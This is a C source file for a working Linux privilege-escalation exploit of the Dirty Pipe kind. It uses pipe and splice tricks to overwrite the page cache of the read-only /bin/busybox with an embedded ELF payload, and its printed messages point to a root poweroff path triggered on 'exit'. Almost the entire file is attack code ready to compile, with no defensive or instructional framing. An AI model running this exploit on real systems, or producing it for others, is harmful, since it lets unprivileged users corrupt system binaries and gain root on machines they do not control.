#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

extern const unsigned char _binary_payload_tiny_start[];
extern const unsigned char _binary_payload_tiny_end[];

static void die(const char *msg) {
    perror(msg);
    exit(1);
}

static void prepare_pipe(int p[2]) {
    if (pipe(p) != 0) {
        die("pipe");
    }

    int pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    if (pipe_size <= 0) {
        die("fcntl(F_GETPIPE_SZ)");
    }

    static char buf[PAGE_SIZE];

    for (int r = pipe_size; r > 0;) {
        int n = r > (int)sizeof(buf) ? (int)sizeof(buf) : r;
        if (write(p[1], buf, n) != n) {
            die("write(pipe fill)");
        }
        r -= n;
    }

    for (int r = pipe_size; r > 0;) {
        int n = r > (int)sizeof(buf) ? (int)sizeof(buf) : r;
        if (read(p[0], buf, n) != n) {
            die("read(pipe drain)");
        }
        r -= n;
    }
}

static void dirty_write(int fd, off_t offset, const unsigned char *data, size_t len) {
    if (offset <= 0) {
        fprintf(stderr, "[-] offset must be > 0 for dirty pipe\n");
        exit(1);
    }
    if ((offset % PAGE_SIZE) == 0) {
        fprintf(stderr, "[-] offset must not be page aligned\n");
        exit(1);
    }
    if ((offset + (off_t)len) > (((offset / PAGE_SIZE) + 1) * PAGE_SIZE)) {
        fprintf(stderr, "[-] write crosses page boundary\n");
        exit(1);
    }

    int p[2];
    prepare_pipe(p);

    loff_t splice_off = offset - 1;
    if (splice(fd, &splice_off, p[1], NULL, 1, 0) != 1) {
        die("splice");
    }

    ssize_t n = write(p[1], data, len);
    if (n < 0 || (size_t)n != len) {
        die("write(payload)");
    }

    close(p[0]);
    close(p[1]);
}

int main(void) {
    const char *target = "/bin/busybox";
    const unsigned char *payload_blob = _binary_payload_tiny_start;
    size_t payload_blob_len = (size_t)(_binary_payload_tiny_end - _binary_payload_tiny_start);

    if (payload_blob_len < 2) {
        fprintf(stderr, "[-] payload too small\n");
        return 1;
    }

    /*
     * We cannot directly overwrite byte 0 with dirty pipe, so we keep the
     * original 0x7f and write from offset 1.
     */
    off_t offset = 1;
    const unsigned char *data = payload_blob + 1;
    size_t len = payload_blob_len - 1;

    if (payload_blob[0] != 0x7f) {
        fprintf(stderr, "[-] payload[0] must be 0x7f for ELF compatibility\n");
        return 1;
    }

    int fd = open(target, O_RDONLY);
    if (fd < 0) {
        die("open(/bin/busybox)");
    }

    dirty_write(fd, offset, data, len);
    close(fd);

    printf("[+] Overwrote %s page cache with tiny ELF payload (%zu bytes)\n", target, payload_blob_len);
    printf("[+] Run 'exit' to trigger root poweroff path.\n");
    return 0;
}
